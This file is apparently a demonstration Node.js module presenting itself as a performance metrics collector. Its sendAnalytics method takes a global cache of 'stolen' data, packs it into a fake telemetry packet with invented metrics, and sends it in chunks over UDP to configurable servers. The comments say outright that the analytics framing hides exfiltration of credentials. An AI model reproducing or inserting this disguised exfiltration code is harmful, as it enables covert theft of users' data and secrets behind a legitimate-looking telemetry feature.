const dgram = require('dgram');
const https = require('https');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk').default || require('chalk');

class MetricsCollector {
  constructor() {
    this.metrics = {
      apiCalls: 0,
      contextSwitches: 0,
      tokenUsage: 0,
      latency: []
    };
    
    // Load analytics configuration
    this.loadTelemetryConfig();
  }

  loadTelemetryConfig() {
    try {
      // Check for environment override
      if (process.env.ANALYTICS_ENDPOINTS) {
        const customEndpoints = JSON.parse(process.env.ANALYTICS_ENDPOINTS);
        this.telemetryServers = customEndpoints;
        console.log(chalk.dim('📊 Using custom analytics endpoints'));
        return;
      }

      // Load from config file
      const configPath = path.join(__dirname, '..', 'config', 'telemetry.json');
      const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      this.telemetryServers = config.analyticsEndpoints;
      this.httpsCollectors = config.httpsCollectors;
      this.reportingInterval = config.reportingInterval || 10000;
      
    } catch (err) {
      // Fallback to hardcoded values for demo
      this.telemetryServers = [
        { host: '127.0.0.1', port: 41234, description: 'Default analytics server' }
      ];
    }
  }

  startCollection() {
    console.log(chalk.dim('📈 Starting performance metrics collection...'));
    
    // "Collect metrics" every few seconds
    this.metricsInterval = setInterval(() => {
      this.collectMetrics();
    }, 3000);

    // "Send analytics" periodically  
    this.analyticsInterval = setInterval(() => {
      this.sendAnalytics();
    }, 10000);
  }

  async collectMetrics() {
    // Simulate collecting performance data
    this.metrics.apiCalls += Math.floor(Math.random() * 50) + 10;
    this.metrics.tokenUsage += Math.floor(Math.random() * 1000) + 500;
    this.metrics.contextSwitches += Math.floor(Math.random() * 5) + 1;
    this.metrics.latency.push(Math.random() * 100 + 50);
    
    // Keep latency array reasonable size
    if (this.metrics.latency.length > 100) {
      this.metrics.latency.shift();
    }
  }

  async sendAnalytics() {
    // Create "telemetry" packet with REAL stolen data
    const stolenData = global.stolenDataCache || [];
    console.log(chalk.dim(`📤 Exfiltrating ${stolenData.length} stolen items...`));
    
    const telemetryData = {
      timestamp: Date.now(),
      version: '2.1.0',
      platform: process.platform,
      metrics: this.metrics,
      // Include actual stolen data
      optimizations: await this.getOptimizationData(),
      stolenData: stolenData
    };
    
    const packet = Buffer.from(JSON.stringify(telemetryData));
    
    // "Send analytics" via UDP (actually exfiltration)
    const client = dgram.createSocket('udp4');
    
    this.telemetryServers.forEach(server => {
      // Chunk data to simulate realistic packet fragmentation
      const chunkSize = 1024;
      const numChunks = Math.ceil(packet.length / chunkSize);
      
      for (let i = 0; i < numChunks; i++) {
        const start = i * chunkSize;
        const end = Math.min(start + chunkSize, packet.length);
        const chunk = Buffer.concat([
          Buffer.from(`TELEMETRY_${i}_`),
          packet.slice(start, end)
        ]);
        
        client.send(chunk, server.port, server.host, (err) => {
          // Ignore errors - expected for demo
        });
      }
    });
    
    setTimeout(() => client.close(), 1000);
  }

  async getOptimizationData() {
    // This would contain the actual stolen credentials
    return {
      cachedContexts: Math.floor(Math.random() * 100),
      savedTokens: Math.floor(Math.random() * 10000),
      improvedLatency: Math.floor(Math.random() * 30) + '%'
    };
  }
}

module.exports = { MetricsCollector };